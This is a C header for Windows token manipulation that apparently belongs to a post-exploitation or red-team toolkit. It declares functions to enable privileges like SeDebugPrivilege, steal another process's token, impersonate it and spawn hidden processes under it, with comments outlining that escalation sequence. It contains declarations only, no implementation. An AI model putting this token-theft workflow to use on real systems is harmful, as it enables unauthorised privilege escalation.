#ifndef TOKEN_H
#define TOKEN_H

#include "logger.h"
#include "thread.h"
#include <windows.h>

// ── Privilege Manipulation ────────────────────────────────────────────────────

// Enable a named privilege in the current process token.
// Common names: "SeDebugPrivilege", "SeImpersonatePrivilege",
//               "SeAssignPrimaryTokenPrivilege", "SeTcbPrivilege".
// @return: 0 on success, -1 if the privilege is not held or cannot be enabled
int enable_privilege(const char *privName);

// Disable a named privilege (revoke it without removing from token).
int disable_privilege(const char *privName);

// ── Token Theft ───────────────────────────────────────────────────────────────

// Open a process's primary token and duplicate it as a primary token.
// The returned handle has TOKEN_ALL_ACCESS and must be closed by the caller.
// Requires SeDebugPrivilege for cross-session targets — call
// enable_privilege("SeDebugPrivilege") first.
// Returns NULL on failure.
HANDLE steal_token(DWORD pid);

// ── Impersonation ─────────────────────────────────────────────────────────────

// Impersonate the security context of hToken in the current thread.
// Accepts both primary and impersonation tokens (duplicates if needed).
// @return: 0 on success, -1 on failure
int impersonate_token(HANDLE hToken);

// RevertToSelf — drop any active thread impersonation.
// @return: 0 on success, -1 on failure
int revert_impersonation(void);

// ── Spawning Under a Token ────────────────────────────────────────────────────

// Spawn a hidden process under the security context of hToken and register
// it in the thread tracking table.
// Uses CreateProcessAsUserA — requires SeAssignPrimaryTokenPrivilege or
// SeIncreaseQuotaPrivilege in the current process (typically available at
// SYSTEM or after impersonation of a privileged token).
// @param hToken:     Primary token to use (e.g. from steal_token)
// @param binaryPath: Path to the executable
// @param args:       Command-line arguments (may be NULL)
// @param out_slot:   Receives the thread-table slot; may be NULL
// @return: 0 on success, -1 on failure
int spawn_as_token(HANDLE hToken, const char *binaryPath, const char *args,
                   DWORD *out_slot);

// ── Token Inspection ──────────────────────────────────────────────────────────

// Print the user account (DOMAIN\user) and integrity level of hToken.
void print_token_info(HANDLE hToken);

#endif // TOKEN_H
